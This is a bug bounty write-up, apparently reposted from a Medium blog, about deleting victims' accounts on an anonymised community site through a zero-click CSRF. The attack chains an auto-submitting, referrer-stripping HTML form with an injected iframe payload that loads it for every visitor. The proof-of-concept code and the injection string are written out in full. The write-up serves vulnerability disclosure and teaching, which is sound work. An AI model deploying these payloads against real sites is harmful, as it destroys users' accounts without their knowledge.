---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-10-03_csrf-attack-0-click-account-delete-1st-write-up.md
original_filename: 2022-10-03_csrf-attack-0-click-account-delete-1st-write-up.md
title: CSRF Attack — 0 click account delete - 1st write-up
category: documents
detected_topics:
- xss
- command-injection
- otp
- automation-abuse
- cors
- csrf
tags:
- imported
- documents
- xss
- command-injection
- otp
- automation-abuse
- cors
- csrf
language: en
raw_sha256: f047b523e22a91d4340cf21787061b668414a06724633cf78c4466be3f9b31f6
text_sha256: 71475f19a996d31db0fe66e2aaf95622d5a8688d519fb06e4dfb3e2a970c6562
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: false
---

# CSRF Attack — 0 click account delete - 1st write-up

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-10-03_csrf-attack-0-click-account-delete-1st-write-up.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, automation-abuse, cors, csrf
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: False
- Raw SHA256: `f047b523e22a91d4340cf21787061b668414a06724633cf78c4466be3f9b31f6`
- Text SHA256: `71475f19a996d31db0fe66e2aaf95622d5a8688d519fb06e4dfb3e2a970c6562`


## Content

---
title: "CSRF Attack — 0 click account delete - 1st write-up"
url: "https://medium.com/@bug_vs_me/csrf-attack-0-click-account-delete-1st-write-up-3d67b267b931"
authors: ["Deepak (@bug_vs_me)"]
bugs: ["CSRF", "HTML injection"]
publication_date: "2022-10-03"
added_date: "2022-10-04"
source: "pentester.land/writeups.json"
original_index: 2090
scraped_via: "browseros"
---

# CSRF Attack — 0 click account delete - 1st write-up

CSRF Attack — 0 click account delete - 1st write-up
Deepak
Follow
3 min read
·
Oct 3, 2022

294

4

I am Deepak, Started bug bounty 5–6 months ago, I am noob in this field correct me if you found something wrong in this post.

So I was hunting bugs on a Program and I have both Admin and User accounts, so can able to full functionality of web applications,

So, I am trying to find CSRF on requests (Admin account) like:-
1.Delete a user
2.Add a user
3.Delete a file
4.Upgrade a user

But, all required an Auth token, so I tried to fuzz endpoints and got blocked by WAF then I use VPN, Russia and continue my testing, after connecting to the VPN I saw a popup saying:-

Are you a citizen of the Russia?
If user clicks on YES, our application shows another popup your data will be deleted, we don’t allow Russian users.
And I capture that end request and the request be linked,

POST /ru/status/
Host: xyz.com
Cookies: blah-blah
Status=yes

So No Auth token used in this POST request,

I immediately created Poc and host that CSRF html poc into my web server

POC:-

<html>
  <body>
  <script>history.pushState('', '', '/')</script>
  <form action="https://xyz.com/ru/status" method="POST">
  <input type="hidden" name="status" value="yes" />
  <input type="submit" value="Submit request" />
  </form>
  </body>
</html>

but, because of blocked by CORS policy Post request can’t be send Post request and got this msg:-

Press enter or click to view image in full size

So i tried to check this request on burp repeater which is send from my server and after reviewing i just tried to remove refer header and Post request was successful, so to do this manually i added this:-

<meta name=”referrer” content=”never”>

Still user need to first click on my link and hen click submit button , result in low impact, so i tried to make this fully automatic 0 interaction required

Get Deepak’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

i added a script

<script>
 window.onload = function(){
 var input = document.getElementById(‘clickButton’);
 input.form.submit();
}
</script>

So this this script will submit form on page load,

New and final Poc:-

<html>
 <body>
 <script>
 window.onload = function(){
 var input = document.getElementById('clickButton');
 input.form.submit();
}
</script>
 <script>history.pushState('', '', '/')</script>
 <form action="https://xyz.com/ru/status" method="POST">
 <input type="hidden" name="status" value="yes" />
 <meta name="referrer" content="never">
 <input id="clickButton" type="submit" value="Submit request" />
 </form>
 </body>
</html>

so I found html injection ( No xss there ),

so i chain it with <iframe> tag

web application is like community we can post their and in body i found that i can able to host <iframe> and <img tag

<img tag work good with get based CSRF so i didn’t used this here

so in my post body i injected

"></span></td><iframe src="https://mywebhost/poc.html" >

So now if anyone just surfing web paged and my post arrived <iframe> tag will execute and first send get request to my server to get poc.html then send a post request to “https://xyz.com/ru/status" with pre loaded form in poc.html in return and victim account will be deleted permanently without any warning or user interaction

Thank you

Twitter:- https://twitter.com/bug_vs_me
